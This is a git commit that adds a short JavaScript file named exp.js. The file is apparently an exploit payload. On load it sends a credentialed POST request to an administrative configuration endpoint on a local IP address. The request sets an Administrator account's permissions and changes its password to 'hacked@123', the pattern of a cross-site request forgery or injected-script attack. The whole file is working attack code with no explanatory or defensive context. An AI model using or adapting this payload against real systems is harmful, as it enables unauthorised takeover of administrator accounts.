3bd29d160feac30f5e84656fbef3cd8102a82a77
jdh5202 <64127451+jdh5202@users.noreply.github.com>
2024-07-08 23:40:56 +0900

    Create exp.js

---
+++ exp.js
@@ -0,0 +1,13 @@
+function execute() {
+  var nuri = "http://192.168.0.16:8080/admin/config";
+  xhttp = new XMLHttpRequest();
+  xhttp.open("POST", nuri, true);
+  xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+  xhttp.withCredentials = "true";
+  var body = "";
+  body += "\r\n\r\n";
+  body += "userName=Administrator&confPermissions=1&pass=hacked@123&cpass=hacked@123&invokeType=web";
+  xhttp.send(body);
+  return true;
+}
+execute();
